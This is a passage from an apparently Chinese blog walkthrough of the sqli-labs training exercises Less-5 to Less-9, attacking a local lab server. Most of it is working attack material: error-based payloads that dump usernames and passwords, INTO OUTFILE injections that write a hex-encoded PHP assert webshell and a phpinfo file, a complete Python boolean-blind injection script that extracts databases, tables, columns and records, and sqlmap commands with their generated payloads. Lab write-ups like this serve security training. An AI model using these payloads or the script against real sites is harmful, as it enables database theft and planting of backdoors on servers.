+http://localhost:32769/Less-5/?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">'and updatexml(1,substr(concat(0x7e,(select group_concat(username,":",password)from users ),0x7e),32,31),1)--+
+#改变偏移 一点一点的爆可以写脚本进行自动化，这里不展开了
+#还可以写入webshell
+?id=1'</span> into outfile <span class="token string">'.less5.php'</span> lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c657373355d293b3f3e-- s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="less-6"><a class="markdownIt-Anchor" href="#less-6"></a> Less-6</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>报错、布尔盲注、延时盲注</td>
+<td><code>id=&quot;$id&quot;</code></td>
+</tr>
+</tbody>
+</table>
+<p>与<code>Less-5</code>一模一样，只是闭合方式不一样</p>
+ <pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost:32769/Less-6/?id=1"and updatexml(1,concat(0x7e,database(),0x7e),1)--+ #爆库名</span>
+updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">--#爆表名</span>
+http:<span class="token comment">//localhost:32769/Less-6/?id=1"and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name="users"),0x7e),1) --+</span>
+<span class="token comment">#爆列名，然后随便查</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="less-7"><a class="markdownIt-Anchor" href="#less-7"></a> Less-7</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>id=(('$id'))</code></td>
+</tr>
+</tbody>
+</table>
+<p>这里发现不会显示报错结果，就排除了联合注入和报错注入</p>
+<p>这里只能使用布尔盲注或者延时盲注了</p>
+<p>布尔盲注示例脚本</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">def</span> <span class="token function">ascii_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#生成库名表名字符所在的字符列表字典</span>
+	str_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#所有可显示字符</span>
+		str_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token comment">#print('可显示字符：%s'%str_list)</span>
+	<span class="token keyword">return</span> str_list<span class="token comment">#返回字符列表</span>
+
+<span class="token keyword">def</span> <span class="token function">db_length</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]开始测试数据库名长度......."</span><span class="token punctuation">)</span>
+	num<span class="token operator">=</span><span class="token number">1</span>
+	<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+		db_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and (length(database())=%d)--+"</span><span class="token operator">%</span>num
+		r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>db_payload<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+			db_length<span class="token operator">=</span>num
+			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]数据库长度：%d\n"</span><span class="token operator">%</span>db_length<span class="token punctuation">)</span>
+			db_name<span class="token punctuation">(</span>db_length<span class="token punctuation">)</span><span class="token comment">#进行下一步，测试库名</span>
+			<span class="token keyword">break</span>
+		<span class="token keyword">else</span><span class="token punctuation">:</span>
+			num <span class="token operator">+=</span> <span class="token number">1</span>
+
+<span class="token keyword">def</span> <span class="token function">db_name</span><span class="token punctuation">(</span>db_length<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]开始测试数据库名......."</span><span class="token punctuation">)</span>
+	db_name<span class="token operator">=</span><span class="token string">''</span>
+	str_list<span class="token operator">=</span>ascii_str<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>db_length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		<span class="token keyword">for</span> j <span class="token keyword">in</span> str_list<span class="token punctuation">:</span>
+			db_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and (ord(mid(database(),%d,1))='%s')--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>
+			r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>db_payload<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+				db_name<span class="token operator">+=</span>j
+				<span class="token keyword">break</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]数据库名：%s\n"</span><span class="token operator">%</span>db_name<span class="token punctuation">)</span>
+	tb_piece<span class="token punctuation">(</span>db_name<span class="token punctuation">)</span><span class="token comment">#进行下一步，测试security数据库有几张表</span>
+	<span class="token keyword">return</span> db_name
+	
+<span class="token keyword">def</span> <span class="token function">tb_piece</span><span class="token punctuation">(</span>db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"开始测试%s数据库有几张表........"</span><span class="token operator">%</span>db_name<span class="token punctuation">)</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#猜解库中有多少张表，合理范围即可</span>
+		tb_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and %d=(select count(table_name) from information_schema.tables where table_schema='%s')--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>db_name<span class="token punctuation">)</span>
+		r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tb_payload<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+			tb_piece<span class="token operator">=</span>i
+			<span class="token keyword">break</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]%s库一共有%d张表\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>db_name<span class="token punctuation">,</span>tb_piece<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	tb_name<span class="token punctuation">(</span>db_name<span class="token punctuation">,</span>tb_piece<span class="token punctuation">)</span><span class="token comment">#进行下一步，猜解表名</span>
+
+
+<span class="token keyword">def</span> <span class="token function">tb_name</span><span class="token punctuation">(</span>db_name<span class="token punctuation">,</span>tb_piece<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]开始猜解表名......."</span><span class="token punctuation">)</span>
+	table_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>tb_piece<span class="token punctuation">)</span><span class="token punctuation">:</span>
+		str_list<span class="token operator">=</span>ascii_str<span class="token punctuation">(</span><span class="token punctuation">)</span>
+		tb_length<span class="token operator">=</span><span class="token number">0</span>
+		tb_name<span class="token operator">=</span><span class="token string">''</span>
+		<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#表名长度，合理范围即可</span>
+			tb_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and (select length(table_name) from information_schema.tables where table_schema=database() limit %d,1)=%d--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
+			r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tb_payload<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+				tb_length<span class="token operator">=</span>j
+				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第%d张表名长度：%s"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>tb_length<span class="token punctuation">)</span><span class="token punctuation">)</span>
+				<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>tb_length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#根据表名长度进行截取对比</span>
+					<span class="token keyword">for</span> l <span class="token keyword">in</span> str_list<span class="token punctuation">:</span>
+						tb_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and (select ord(mid((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)))=%d--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>k<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span>
+						r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>tb_payload<span class="token punctuation">)</span>
+						<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+							tb_name<span class="token operator">+=</span>l
+				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]：%s"</span><span class="token operator">%</span>tb_name<span class="token punctuation">)</span>
+				table_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>tb_name<span class="token punctuation">)</span>
+				<span class="token keyword">break</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+]%s库下的%s张表：%s\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>db_name<span class="token punctuation">,</span>tb_piece<span class="token punctuation">,</span>table_list<span class="token punctuation">)</span><span class="token punctuation">)</span>
+	column_num<span class="token punctuation">(</span>table_list<span class="token punctuation">,</span>db_name<span class="token punctuation">)</span><span class="token comment">#进行下一步，猜解每张表的字段数</span>
+
+<span class="token keyword">def</span> <span class="token function">column_num</span><span class="token punctuation">(</span>table_list<span class="token punctuation">,</span>db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]开始猜解每张表的字段数：......."</span><span class="token punctuation">)</span>
+	column_num_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> table_list<span class="token punctuation">:</span>
+		<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#每张表的字段数量，合理范围即可</span>
+			column_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and %d=(select count(column_name) from information_schema.columns where table_name='%s')--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>i<span class="token punctuation">)</span>
+			r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>column_payload<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+				column_num<span class="token operator">=</span>j
+				column_num_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>column_num<span class="token punctuation">)</span><span class="token comment">#把所有表的字段，依次放入这个列表当中</span>
+				<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]%s表\t%s个字段"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>column_num<span class="token punctuation">)</span><span class="token punctuation">)</span>
+				<span class="token keyword">break</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+]表对应的字段数：%s\n"</span><span class="token operator">%</span>column_num_list<span class="token punctuation">)</span>
+	column_name<span class="token punctuation">(</span>table_list<span class="token punctuation">,</span>column_num_list<span class="token punctuation">,</span>db_name<span class="token punctuation">)</span><span class="token comment">#进行下一步，猜解每张表的字段名</span>
+
+<span class="token keyword">def</span> <span class="token function">column_name</span><span class="token punctuation">(</span>table_list<span class="token punctuation">,</span>column_num_list<span class="token punctuation">,</span>db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-]开始猜解每张表的字段名......."</span><span class="token punctuation">)</span>
+	column_length<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+	str_list<span class="token operator">=</span>ascii_str<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	column_name_list<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
+	<span class="token keyword">for</span> t <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>table_list<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#t在这里代表每张表的列表索引位置</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+]%s表的字段："</span><span class="token operator">%</span>table_list<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span>
+		<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>column_num_list<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#i表示每张表的字段数量</span>
+			column_name<span class="token operator">=</span><span class="token string">''</span>
+			<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#j表示每个字段的长度</span>
+				column_name_length<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"' and %d=(select length(column_name) from information_schema.columns where table_name='%s' limit %d,1)--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span>table_list<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span>
+				r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>column_name_length<span class="token punctuation">)</span>
+				<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+					column_length<span class="token punctuation">.</span>append<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+					<span class="token keyword">break</span>
+				<span class="token keyword">for</span> k <span class="token keyword">in</span> str_list<span class="token punctuation">:</span><span class="token comment">#k表示我们猜解的字符字典</span>
+					column_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and ord(mid((select column_name from information_schema.columns where table_name='%s' limit %d,1),%d,1))=%d--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>table_list<span class="token punctuation">[</span>t<span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>
+					r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>column_payload<span class="token punctuation">)</span>
+					<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+						column_name<span class="token operator">+=</span>k
+			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]：%s'</span><span class="token operator">%</span>column_name<span class="token punctuation">)</span>
+			column_name_list<span class="token punctuation">.</span>append<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>
+	<span class="token comment">#print(column_name_list)#输出所有表中的字段名到一个列表中</span>
+	dump_data<span class="token punctuation">(</span>table_list<span class="token punctuation">,</span>column_name_list<span class="token punctuation">,</span>db_name<span class="token punctuation">)</span><span class="token comment">#进行最后一步，输出指定字段的数据</span>
+
+<span class="token keyword">def</span> <span class="token function">dump_data</span><span class="token punctuation">(</span>table_list<span class="token punctuation">,</span>column_name_list<span class="token punctuation">,</span>db_name<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[-]对%s表的%s字段进行爆破.......\n"</span><span class="token operator">%</span><span class="token punctuation">(</span>table_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>column_name_list<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	str_list<span class="token operator">=</span>ascii_str<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	<span class="token keyword">for</span> i <span class="token keyword">in</span> column_name_list<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">:</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment">#id,username,password字段</span>
+		<span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#j表示有多少条数据，合理范围即可</span>
+			data_num_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and (select count(%s) from %s.%s)=%d--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>db_name<span class="token punctuation">,</span>table_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span>
+			r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>data_num_payload<span class="token punctuation">)</span>
+			<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+				data_num<span class="token operator">=</span>j
+				<span class="token keyword">break</span>
+		<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n[+]%s表中的%s字段有以下%s条数据："</span><span class="token operator">%</span><span class="token punctuation">(</span>table_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>data_num<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>data_num<span class="token punctuation">)</span><span class="token punctuation">:</span>
+			data_len<span class="token operator">=</span><span class="token number">0</span>
+			dump_data<span class="token operator">=</span><span class="token string">''</span>
+			<span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#l表示每条数据的长度，合理范围即可</span>
+				data_len_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and ascii(substr((select %s from %s.%s limit %d,1),%d,1))--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>db_name<span class="token punctuation">,</span>table_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>l<span class="token punctuation">)</span>
+				r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>data_len_payload<span class="token punctuation">)</span>
+				<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+					data_len<span class="token operator">=</span>l<span class="token operator">-</span><span class="token number">1</span>
+					<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>data_len<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#x表示每条数据的实际范围，作为mid截取的范围</span>
+						<span class="token keyword">for</span> y <span class="token keyword">in</span> str_list<span class="token punctuation">:</span>
+							data_payload<span class="token operator">=</span>url<span class="token operator">+</span><span class="token string">"and ord(mid((select %s from %s.%s limit %d,1),%d,1))=%d--+"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>db_name<span class="token punctuation">,</span>table_list<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>k<span class="token punctuation">,</span>x<span class="token punctuation">,</span><span class="token builtin">ord</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span>
+							r<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>data_payload<span class="token punctuation">)</span>
+							<span class="token keyword">if</span> <span class="token builtin">str</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+								dump_data<span class="token operator">+=</span>y
+								<span class="token keyword">break</span>
+					<span class="token keyword">break</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'[+]%s'</span><span class="token operator">%</span>dump_data<span class="token punctuation">)</span><span class="token comment">#输出每条数据</span>
+
+
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+	url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:32769/Less-7/?id=1'))"</span><span class="token comment">#目标url</span>
+	<span class="token builtin">str</span><span class="token operator">=</span><span class="token string">"You are in"</span><span class="token comment">#布尔型盲注的true&amp;false的判断因素</span>
+	db_length<span class="token punctuation">(</span>url<span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment">#程序入口</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="sqlmap-2"><a class="markdownIt-Anchor" href="#sqlmap-2"></a> sqlmap</h4>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.132789/Less-7/?id=1"</span> <span class="token parameter variable">--dbms</span><span class="token operator">=</span>MySQL --random-agent --flush-session <span class="token parameter variable">--technique</span><span class="token operator">=</span>B <span class="token parameter variable">-v</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND 3542&#x3D;3542 AND (&#39;rmsD&#39;&#x3D;&#39;rmsD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://127.0.0.1:32789/Less-7/?id=1"</span> <span class="token parameter variable">--dbms</span><span class="token operator">=</span>MySQL --random-agent --flush-session <span class="token parameter variable">--technique</span><span class="token operator">=</span>T <span class="token parameter variable">-v</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-payload" data-language="payload"><code class="language-payload">id&#x3D;1&#39;) AND (SELECT 9943 FROM (SELECT(SLEEP(5)))XOYy) AND (&#39;QUpy&#39;&#x3D;&#39;QUpy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="写入webshell"><a class="markdownIt-Anchor" href="#写入webshell"></a> 写入webshell</h4>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">/</span>?id<span class="token operator">=</span><span class="token number">1</span>'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token keyword">UNION</span><span class="token operator">+</span><span class="token keyword">SELECT</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"&lt;?php phpinfo();?>"</span> <span class="token keyword">INTO</span> <span class="token keyword">OUTFILE</span> <span class="token string">"/var/www/html/Less-7/info.php"</span><span class="token comment">--+ </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h3 id="less-8"><a class="markdownIt-Anchor" href="#less-8"></a> Less-8</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>布尔盲注、延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table>
+<p>与<code>Less-7</code>一样,修改拼接方式即可</p>
+<h3 id="less-9"><a class="markdownIt-Anchor" href="#less-9"></a> Less-9</h3>
+<table>
+<thead>
+<tr>
+<th>请求方式</th>
+<th>注入类型</th>
+<th>拼接方式</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>GET</td>
+<td>延时盲注</td>
+<td><code>id='$id'</code></td>
+</tr>
+</tbody>
+</table>
+<p>首先看源代码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment"># 使用单引号拼接</span>
+<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"SELECT * FROM users WHERE id='<span class="token interpolation"><span class="token variable">$id</span></span>' LIMIT 0,1"</span><span class="token punctuation">;</span>
+
+<span class="token comment"># 支持延时盲注</span>
+<span class="token keyword">if</span> <span class="token constant boolean">true</span><span class="token punctuation">:</span>
+    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    输出 You are in<span class="token operator">...</span><span class="token operator">...</span><span class="token operator">...</span><span class="token operator">.</span><span class="token operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>由于报错是一样的，我们找不到布尔的判断标准，也就无从使用布尔盲注</p>
+<p>所以只能使用延时盲注</p>
